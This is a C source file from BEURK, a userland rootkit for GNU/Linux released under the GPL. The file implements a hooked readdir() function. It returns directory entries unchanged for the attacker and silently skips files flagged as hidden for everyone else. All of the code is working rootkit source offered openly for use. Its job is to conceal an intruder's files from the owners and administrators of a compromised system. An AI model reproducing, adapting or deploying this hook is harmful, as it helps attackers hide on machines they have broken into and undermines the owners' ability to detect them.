/*
 * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
 * Copyright (C) 2015  unix-thrust
 *
 * This file is part of BEURK.
 *
 * BEURK is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * BEURK is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <dirent.h> /* struct dirent, DIR */
#include <string.h> /* strcmp() */
#include "beurk.h" /* is_attacker(), is_hidden_file() */
#include "config.h" /* REAL_READDIR() */
#include "debug.h" /* DEBUG() */
#include "hooks.h" /* prototype */

struct dirent   *readdir(DIR *dirp) {
    init();
    DEBUG(D_INFO, "called readdir(3) hook");

    struct dirent   *dir;

    dir = REAL_READDIR(dirp);

    if (is_attacker())
        return (dir);

    while (dir && strcmp(dir->d_name, ".") && is_hidden_file(dir->d_name)) {
        dir = REAL_READDIR(dirp);
    }
    return (dir);
}
